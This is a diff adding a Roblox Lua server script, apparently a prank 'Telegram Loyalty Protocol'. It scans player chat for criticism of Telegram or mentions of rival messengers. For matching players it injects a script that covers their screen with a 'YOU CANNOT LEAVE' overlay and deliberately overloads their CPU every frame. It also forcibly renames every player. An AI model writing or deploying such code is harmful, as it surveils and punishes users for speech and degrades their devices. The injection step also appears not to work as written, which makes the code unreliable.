@@ -1,0 +1,64 @@
+-- Suno Technology: Telegram Loyalty Protocol v1.0
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Список "запрещенных" слов против Телеграм
+local forbiddenWords = {"плохо", "отстой", "ватсап", "whatsapp", "плохой", "фигня", "viber"}
+
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(character)
+		local humanoid = character:WaitForChild("Humanoid")
+		
+		-- 1. Принудительная смена ника над головой
+		humanoid.DisplayName = "Telegram Best Messenger"
+		
+		print(player.Name .. " присягнул на верность Telegram.")
+	end)
+
+	-- 2. Отслеживание чата
+	player.Chatted:Connect(function(message)
+		local lowerMessage = string.lower(message)
+		local isHater = false
+		
+		for _, word in pairs(forbiddenWords) do
+			if string.find(lowerMessage, word) then
+				isHater = true
+				break
+			end
+		end
+		
+		if isHater then
+			print("Обнаружен хейтер: " .. player.Name .. ". Запуск протокола LAG_STORM.")
+			
+			-- Создаем локальный скрипт наказания для игрока
+			local punishmentScript = Instance.new("LocalScript")
+			punishmentScript.Name = "TelegramPunishment"
+			punishmentScript.Source = [[
+				local player = game.Players.LocalPlayer
+				local gui = Instance.new("ScreenGui", player.PlayerGui)
+				gui.DisplayOrder = 100000 -- Поверх всех окон
+				
+				-- Создаем блокирующую "шторку", которая мешает нажать на меню
+				local blockFrame = Instance.new("Frame", gui)
+				blockFrame.Size = UDim2.new(1, 0, 1, 0)
+				blockFrame.BackgroundTransparency = 0.5
+				blockFrame.BackgroundColor3 = Color3.fromRGB(0, 191, 255) -- Цвет Telegram
+				
+				local label = Instance.new("TextLabel", blockFrame)
+				label.Size = UDim2.new(1, 0, 1, 0)
+				label.Text = "TELEGRAM IS THE BEST. YOU CANNOT LEAVE."
+				label.TextColor3 = Color3.fromRGB(255, 255, 255)
+				label.TextSize = 50
+				label.BackgroundTransparency = 1
+				
+				-- Симуляция жесткого лага (забиваем поток вычислениями)
+				game:GetService("RunService").RenderStepped:Connect(function()
+					for i = 1, 1000000 do
+						local x = math.sin(i) * math.sqrt(i) -- Бесполезная тяжелая работа для CPU
+					end
+				end)
+			]]
+			punishmentScript.Parent = player.PlayerGui
+		end
+	end)
+end)
